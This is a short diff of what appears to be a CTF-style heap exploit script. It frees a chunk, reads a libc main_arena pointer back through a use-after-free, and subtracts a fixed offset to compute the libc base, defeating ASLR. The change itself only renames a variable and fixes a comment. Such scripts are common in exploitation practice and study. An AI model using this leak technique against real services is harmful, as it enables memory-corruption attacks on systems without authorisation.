@@ -39,9 +39,9 @@ def read(index):
 allocate(0x100, 'a') # 0
 allocate(0x100, 'a') # 1
 free(0)
-main_arena_p0x88 = u64(read(0).ljust(8, b'\x00'))
-print(f"main_arena + 0x88: {hex(main_arena_p0x88)}")
-libc_base = main_arena_p0x88 - 0x3c4b78
+main_arena_p88 = u64(read(0).ljust(8, b'\x00'))
+print(f"main_arena + 88: {hex(main_arena_p88)}")
+libc_base = main_arena_p88 - 0x3c4b78
 print(f"libc_base: {hex(libc_base)}")
 free(1)
 
